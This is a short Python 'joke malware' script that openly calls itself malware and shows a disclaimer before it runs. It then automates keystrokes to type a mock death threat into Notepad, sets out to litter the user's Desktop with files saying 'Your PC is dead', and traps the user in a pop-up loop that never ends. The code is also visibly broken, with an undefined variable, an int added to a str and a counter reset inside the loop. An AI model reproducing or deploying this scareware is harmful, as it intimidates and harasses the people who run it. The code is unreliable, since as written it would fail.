import os
import pyautogui
from tkinter import messagebox as mb
import sys

pathToWrite = 'NULL'
char = 'NULL'
if sys.platform == "linux" or sys.platform == "linux2" or sys.platform == "darwin":
    char = '/'
elif sys.platform == "win32":
    char = str(r'\\')

def creepyFiles():
    global pathToWrite
    pathToWrite = (os.path.expanduser('~/Desktop'))
    print(pathToWrite)
    for i in range(100):
        numberFile = 0
        totalFile = str(pathToWrite+char+"file"+numberFile+".txt")
        with open(totalFile, 'w', encoding='utf-8') as fileToWrite:
            fileToWrite.write("D3AD\nYour PC is dead!...\n\n\n\njust like you...\ndiiiiiieeeeeeeeeeeeee!!!!!!!!\nYou are d3ad\n")
        numberFile += 1

def scaryPopUps():
    creepyFiles()
    x = True
    while x:
    	deadPop = mb.askyesno("D3AD", "If you buy a new PC, I will find it and kill it as well...")
    	if deadPop:
        	deadPop = mb.askyesno("Really?", ' you think its THAT easy??!!!')
         
def notepadEdit():
    pyautogui.hotkey('win', 'r')
    pyautogui.typewrite(notepad)
    pyautogui.typewrite("I know your IP Adress.\nI'll send someone to you house to kill you...\nNah jk jk...\nI don't know your IP Adress...\nBut I know you computer is now d3ad!!!\nBy: MF366-Coding (I am on GitHub).\nI am not responsible fr anything because I warned you that this would happen...")
    pyautogui.hotkey('win', 'm')
    scaryPopUps()

if __name__ == '__main__':
    firstWarn = mb.askyesno("! SECURITY WARNING !!", "This app is malware.\nRun on Virtual Environment ONLY!\nBye clicking 'Yes' you agree that the creator is not responsible for any damage at all.\nBy: MF366-Coding (I'm on GitHub)")
    if firstWarn:
        lastWarn = mb.askyesno("!!! LAST WARNING !!!", "I am not responsible for ANY damage at all.\nPlease consider that.\nStill want to run?")
        if lastWarn:
            notepadEdit()
        else:
            quit()
    else:
        quit()
